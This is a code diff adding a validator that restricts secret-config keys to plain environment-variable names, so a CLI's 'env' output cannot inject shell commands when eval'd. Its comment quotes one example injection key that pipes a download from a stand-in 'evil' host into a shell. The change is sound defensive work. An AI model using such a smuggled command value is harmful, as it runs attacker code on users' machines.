@@ -33,6 +33,31 @@ function isPlaceholderEntryId(entryId: string): boolean {
   return entryId === "dummy-entry-id" || /^<[^>]+>$/.test(entryId);
 }
 
+// Config keys become env-var NAMES emitted as `export ${key}=...` / `${key}=...`
+// by the `env` command, which is documented for `eval $(passwd-sso env)` and
+// `source`. An unvalidated key is a shell-injection sink: a key like
+// `SAFE; curl evil|sh #` would execute arbitrary commands when eval'd. Restrict
+// keys to POSIX-portable env-var names — the character class excludes every
+// shell metacharacter, so no injection payload can pass. JS `$` (no `m` flag)
+// matches only end-of-input, so a trailing newline cannot slip through either.
+const ENV_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
+const MAX_ENV_NAME_LENGTH = 128;
+
+function assertValidEnvName(envName: string): void {
+  if (envName.length > MAX_ENV_NAME_LENGTH) {
+    throw new Error(
+      `Secret mapping key is too long (max ${MAX_ENV_NAME_LENGTH} characters).`,
+    );
+  }
+  if (!ENV_NAME_RE.test(envName)) {
+    // Do NOT echo the raw key — it may carry an injection payload.
+    throw new Error(
+      "Secret mapping key must be a valid environment variable name " +
+        "(letters, digits, underscore; not starting with a digit).",
+    );
+  }
+}
+
 export function loadSecretsConfig(configPath?: string): SecretsConfig {
   const filePath = configPath
     ? resolve(configPath)
@@ -50,6 +75,7 @@ export function loadSecretsConfig(configPath?: string): SecretsConfig {
   }
 
   for (const [envName, mapping] of Object.entries(parsed.secrets)) {
+    assertValidEnvName(envName);
     if (!mapping || typeof mapping !== "object") {
       throw new Error(`Secret mapping for '${envName}' must be an object.`);
     }
